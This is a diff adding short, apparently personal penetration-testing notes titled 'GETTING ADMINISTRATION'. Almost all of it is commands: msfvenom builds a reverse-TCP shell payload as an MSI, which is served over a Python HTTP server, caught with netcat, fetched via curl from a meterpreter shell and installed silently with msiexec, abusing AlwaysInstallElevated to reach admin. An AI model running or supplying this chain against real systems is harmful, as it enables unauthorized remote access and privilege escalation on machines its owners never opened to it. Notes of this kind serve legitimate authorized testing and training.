@@ -1,0 +1,17 @@
+#################### GETTING ADMINISTRATION #######################
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<> LPORT=<> -f msi -o reverse.msi
+
+python -m SimpleHTTPServer 8000
+
+start netcat on same port
+
+in meterpreter, use shell,then curl reverse.msi to alwaysinstallelevated.msi
+
+msiexec /quiet /qn /i setup.msi
+
+msiexec /quiet /qn /i alwaysinstallelevated.msi
+
+GOT ADMIN.
+
+
